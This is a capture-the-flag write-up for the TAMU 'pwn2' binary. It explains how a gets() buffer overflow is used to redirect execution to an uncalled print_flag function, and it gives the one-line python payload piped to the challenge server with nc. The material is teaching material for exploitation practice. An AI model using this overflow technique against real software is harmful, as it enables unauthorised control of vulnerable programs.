# pwn2
---

As with most exploit challenges, let's copy the binary to a Linux system and take a look!  Once in Linux, we will check the security implementations of the file using checksec with gdb-peda.  Then, we will run the file and strings command on the binary to see if we can get any hints.

```bash
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
```

From this, we get an idea of what we are going to be able to do.  No Canary means buffer and heap overflows will work but NX being enabled means no shellcode execution from the stack.

```bash
user@ubuntu:~/TAMU$ file ./pwn2
./pwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7bc1a419a4b258706db93ad2f8785e46fdee9636, not stripped
user@ubuntu:~/TAMU$ strings pwn2
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
fopen
puts
putchar
```

From the file command, you can tell it is a 32-bit ELF executable and from strings command, we can already tell the vulnerability we are probably going to exploit.  "gets" is a popular vulnerability in entry-level CTFs and probably what the program is using to read input from the user somewhere.  So run the program and take a look.

```bash
user@ubuntu:~/TAMU$ ./pwn2
I just love repeating what other people say!
I bet I can repeat anything you tell me!
Hello!
Hello!
```

This didn't give us any hints so take a look at the disassembly in IDAPro.

![image](http://killyp.com/wp-content/uploads/2018/02/Capture-4.jpg)

So just as suspected the echo function contains a _gets call that we can overflow the buffer with and get flow control via the EIP register.  There is also a print_flag function that is never called. Don't know about you but I suspect we just need to redirect program flow to this print_flag function.  To do that we need the address of the print_flag function and the size of the overflow needed to overwrite the old EIP saved on the stack. We get a hint in the disassembly about the size of the overflow needed in that there is only one variable and it is located at EBP-0xEF.  0xEF is 239 in decimal so the length of our buffer overflow then needs to be 243 characters to fill up the allocated memory for s and then overwrite the old EBP that has been saved on the stack.  For more visual people, the stack will look something like this:

```
----------------------                                       
|          SSS        |<----The first 3 bytes of our input   
|---------------------|                                      
|          ...        |<----236 bytes of our input           
|---------------------|                                      
|          SSSS       |<----The last 4 bytes of out input    
|---------------------|                                      
|          EBP        |<----The old saved base pointer       
|---------------------|                                      
|          EIP        |<----The old Instruciton pointer. We  
-----------------------      need to overwrite this with the 
                             address of print_flag           
```

We can also get the location of print_flag from IDA by changing the view with spacebar.

![image](http://killyp.com/wp-content/uploads/2018/02/Capture-5.jpg)

Here we can see the location of print_flag is at 0x0804854B.  So let's build out exploit!

Since this exploit doesn't involve shellcode or anything fancy I am just going to use python's -c flag to output the text we need and pipe it into the stdin of the program.  Our exploit will be structured:
243 "A"s + address of print_flag

Remember that the address needs to be in Little Endian.  Our exploit ends up looking like this:

```python
python -c 'print("A"*243 + "\x4B\x85\x04\x08")' | nc pwn.ctf.tamu.edu 4322
```

Which yields...

![image](http://killyp.com/wp-content/uploads/2018/02/Capture-6-e1519695718223.jpg)

Success!
